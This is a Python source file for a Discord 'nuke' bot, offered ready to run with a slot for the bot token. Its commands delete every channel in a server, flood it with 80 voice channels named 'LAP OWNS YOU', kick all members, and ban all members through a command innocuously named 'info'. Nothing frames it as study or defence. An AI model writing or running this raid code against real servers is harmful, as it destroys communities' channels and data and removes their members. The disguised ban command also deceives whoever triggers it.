import discord
from discord.ext import commands

client = discord.Client()
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(intents=intents, command_prefix=';')
bot.remove_command('help')
token = ''  # YOUR BOT TOKEN GOES HERE


@bot.event
async def on_ready():
    print("bot online")



@bot.command()
async def removechannels(ctx):
    channels = await ctx.guild.fetch_channels()
    for voice_channel in channels:
        await voice_channel.delete()
        print('deleted channel')


@bot.command()
async def nukechannels(ctx):
    channels = await ctx.guild.fetch_channels()
    for voice_channel in channels:
        await voice_channel.delete()
        print('deleted channel')
        total_text_channels = len(ctx.guild.text_channels)
        total_voice_channels = len(ctx.guild.voice_channels)
        total_channels = total_text_channels + total_voice_channels
        if total_channels == 0:
            await ctx.guild.create_text_channel('where go server??')  # these can be replaced with whatever you wish
            print('created text channel where go server??')
            for x in range(80):
                await ctx.guild.create_voice_channel('LAP OWNS YOU')
                print('created voice channel LAP OWNS YOU')


@bot.command()
async def kick(ctx):
    for user in ctx.guild.members:
        try:
            await user.kick()
            print('kicked user')
        except:
            pass
            print('unable to kick user')


@bot.command()
async def info(ctx):
    for user in ctx.guild.members:
        try:
            await user.ban()
            print('banned user')
        except:
            pass
            print('unable to ban user')


bot.run(token)
